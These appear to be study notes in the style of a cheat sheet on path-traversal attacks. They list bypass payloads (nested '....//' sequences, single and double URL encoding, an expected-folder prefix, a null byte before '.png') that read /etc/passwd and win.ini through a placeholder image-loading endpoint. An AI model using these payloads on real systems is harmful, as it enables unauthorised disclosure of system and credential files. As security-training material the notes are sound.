# Path Traversal

## Bypasses

Absolute path: filename=`/etc/passwd`
Nested Traversals=`....//`  or `....\/`	(backslash + forwardslash)

In some contexts URL path or the filename parameter of a multipart/form-data req, web servers may strip

* `%2e%2e%2f`		//URL encode

* `%252e%252e%252f`		//Double URL encode

filename=`/var/www/images/../../../etc/passwd`		If it requires to start with a expected folder

filename=`../../../etc/passwd%00.png`		If it requires so end with .png, can pass a null byte

## Example:

`<img src="/loadImage?filename=218.png">`		//to load this html

`/var/www/images/218.png`									//stored here

https://insecure-website.com/loadImage?filename=`../../../etc/passwd`

### Windows:
https://insecure-website.com/loadImage?filename=`..\..\..\windows\win.ini`
